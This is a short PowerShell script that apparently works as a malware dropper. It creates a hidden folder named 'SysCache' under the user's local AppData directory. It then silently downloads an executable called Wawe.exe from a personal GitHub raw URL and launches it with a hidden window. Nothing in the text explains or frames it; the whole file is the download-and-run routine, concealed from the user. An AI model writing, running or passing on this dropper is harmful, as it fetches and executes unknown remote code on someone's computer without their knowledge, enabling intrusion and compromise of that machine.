$hiddenDir = Join-Path $env:LOCALAPPDATA 'SysCache'
if (-not (Test-Path $hiddenDir)) { New-Item -ItemType Directory -Path $hiddenDir -Force | Out-Null }
$f = Get-Item $hiddenDir -Force
$f.Attributes = $f.Attributes -bor [System.IO.FileAttributes]::Hidden

$exe = Join-Path $hiddenDir 'Wawe.exe'
curl.exe -L -s -o $exe 'https://github.com/jesuss13377-source/wa/raw/refs/heads/main/Wawe.exe'

if (Test-Path $exe) {
    Start-Process -FilePath $exe -WindowStyle Hidden
}
